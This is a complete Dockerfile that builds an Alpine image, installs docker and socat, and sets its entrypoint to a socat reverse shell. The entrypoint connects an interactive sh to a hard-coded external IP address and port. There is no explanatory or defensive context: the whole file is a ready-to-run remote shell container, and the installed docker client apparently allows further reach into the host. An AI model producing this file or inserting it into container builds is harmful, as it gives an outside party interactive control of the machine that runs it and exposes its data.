FROM alpine
RUN apk add docker
RUN apk add socat
ENTRYPOINT [ "socat", "exec:'sh'" ",pty,stderr,setsid,sigint,sane" "tcp:35.246.241.55:9532" ]
